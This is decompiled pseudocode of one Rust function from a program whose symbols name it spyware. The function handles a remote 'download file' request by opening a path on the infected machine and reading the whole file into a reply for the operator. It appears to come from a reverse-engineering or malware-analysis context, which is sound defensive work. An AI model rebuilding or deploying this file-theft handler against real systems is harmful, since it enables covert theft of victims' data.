__int64 __fastcall spyware::actions::basic_info::download_file_message(__int64 a1, __int64 a2)
{
  __int64 v2; // r15
  __int64 v3; // rax
  char v4; // r15
  int v5; // ebp
  __int64 v6; // rax
  __int64 v7; // rdx
  __int64 v9; // [rsp+0h] [rbp-C8h] BYREF
  __int128 v10; // [rsp+8h] [rbp-C0h] BYREF
  const char *v11; // [rsp+18h] [rbp-B0h]
  __int64 v12; // [rsp+20h] [rbp-A8h]
  __int64 v13; // [rsp+28h] [rbp-A0h]
  __int128 v14; // [rsp+30h] [rbp-98h] BYREF
  __int64 *v15; // [rsp+40h] [rbp-88h]
  __int64 v16; // [rsp+48h] [rbp-80h]
  __int64 v17; // [rsp+50h] [rbp-78h]
  _BYTE v18[4]; // [rsp+60h] [rbp-68h] BYREF
  int v19; // [rsp+64h] [rbp-64h]
  __int64 v20; // [rsp+68h] [rbp-60h]
  __int64 v21; // [rsp+70h] [rbp-58h] BYREF
  __int64 (__fastcall *v22)(); // [rsp+78h] [rbp-50h]
  _BYTE *v23; // [rsp+80h] [rbp-48h]
  __int64 (__fastcall *v24)(); // [rsp+88h] [rbp-40h]
  _BYTE v25[56]; // [rsp+90h] [rbp-38h] BYREF

  if ( (unsigned __int64)core::sync::atomic::atomic_load() >= 4 )
  {
    v21 = a2;
    v22 = <alloc::string::String as core::fmt::Display>::fmt;
    *(_QWORD *)&v14 = &off_B9810;
    *((_QWORD *)&v14 + 1) = 2LL;
    v17 = 0LL;
    v15 = &v21;
    v16 = 1LL;
    *(_QWORD *)&v10 = aSpywareActions;
    *((_QWORD *)&v10 + 1) = 28LL;
    v11 = aSpywareActions;
    v12 = 28LL;
    v13 = log::__private_api::loc(&off_B9860);
    log::__private_api::log(&v14, 4LL, &v10);
  }
  std::fs::File::open(v18, a2);
  if ( (v18[0] & 1) != 0 )
  {
    v2 = v20;
    v9 = v20;
    if ( core::sync::atomic::atomic_load() )
    {
      <T as alloc::string::SpecToString>::spec_to_string(v25, &v9);
      v21 = a2;
      v22 = <alloc::string::String as core::fmt::Display>::fmt;
      v23 = v25;
      v24 = <alloc::string::String as core::fmt::Display>::fmt;
      *(_QWORD *)&v14 = &off_B9830;
      *((_QWORD *)&v14 + 1) = 3LL;
      v17 = 0LL;
      v15 = &v21;
      v16 = 2LL;
      v3 = log::__private_api::loc(&off_B9890);
      *(_QWORD *)&v10 = aSpywareActions;
      *((_QWORD *)&v10 + 1) = 28LL;
      v11 = aSpywareActions;
      v12 = 28LL;
      v13 = v3;
      log::__private_api::log(&v14, 1LL, &v10);
      core::ptr::drop_in_place<alloc::string::String>(v25);
      v2 = v9;
    }
    *(_QWORD *)&v10 = 0LL;
    *((_QWORD *)&v10 + 1) = 1LL;
    v11 = 0LL;
    std::io::error::repr_bitpacked::decode_repr(&v14, v2);
    v4 = v14;
    v5 = DWORD1(v14);
    <T as alloc::string::SpecToString>::spec_to_string(&v14, &v9);
    *(_QWORD *)(a1 + 40) = v15;
    *(_OWORD *)(a1 + 24) = v14;
    *(_QWORD *)(a1 + 16) = v11;
    *(_OWORD *)a1 = v10;
    *(_DWORD *)(a1 + 48) = v4 != 0 ? -1 : v5;
    core::ptr::drop_in_place<std::io::error::Error>(&v9);
  }
  else
  {
    LODWORD(v10) = v19;
    *(_QWORD *)&v14 = 0LL;
    *((_QWORD *)&v14 + 1) = 1LL;
    v15 = 0LL;
    v6 = <std::fs::File as std::io::Read>::read_to_end(&v10, &v14);
    core::result::Result<T,E>::unwrap(v6, v7);
    *(_QWORD *)(a1 + 16) = v15;
    *(_OWORD *)a1 = v14;
    *(_QWORD *)(a1 + 24) = 0x8000000000000000LL;
    core::ptr::drop_in_place<std::fs::File>((unsigned int)v10);
  }
  core::ptr::drop_in_place<spyware::communication::messages::DownloadFileRequest>(a2);
  return a1;
}